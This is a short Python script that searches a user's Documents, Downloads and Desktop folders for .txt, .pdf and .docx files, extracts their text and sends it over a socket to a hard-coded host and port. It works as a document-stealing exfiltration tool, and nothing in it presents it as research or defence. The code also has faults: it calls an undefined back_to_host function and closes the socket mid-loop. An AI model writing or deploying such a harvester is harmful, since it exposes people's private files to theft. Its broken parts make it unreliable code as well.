import os
import PyPDF2
import docx
import socket
#works as of 5/3/17
def main():
    #home = os.path.expanduser("~"), same as os.getcwd()
    #os.path.join(home, "Downloads")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 400))

    the_directory = os.path.expanduser("~")
    locations = ["Documents", "Downloads", "Desktop"]

    for i in locations:
        directory_path = os.path.join(the_directory, i)
        for the_file in os.listdir(directory_path):

            if the_file.endswith(".txt"):
                try:
                    f = open(os.path.join(directory_path, the_file)).read()
                    sock.send(f)

                except:
                    pass

            elif the_file.endswith(".pdf"): #may have to remove pdf compatability
                the_file = open(os.path.join(directory_path, the_file), 'rb')
                the_reader = PyPDF2.PdfFileReader(the_file)
                for b in range(the_reader.numPages):
                    try:
                        final_object = the_reader.getPage(b)
                        the_text = final_object.extractText()
                        back_to_host(the_text)
                    except:
                        pass

            elif the_file.endswith(".docx"):
                try:
                    the_doc = docx.Document(os.path.join(directory_path, the_file))

                    pdf_data = ''.join([the_doc.paragraphs[c].text for c in range(len(the_doc.paragraphs))])
                    sock.send(pdf_data)
                except:
                    pass
        sock.close()
main()
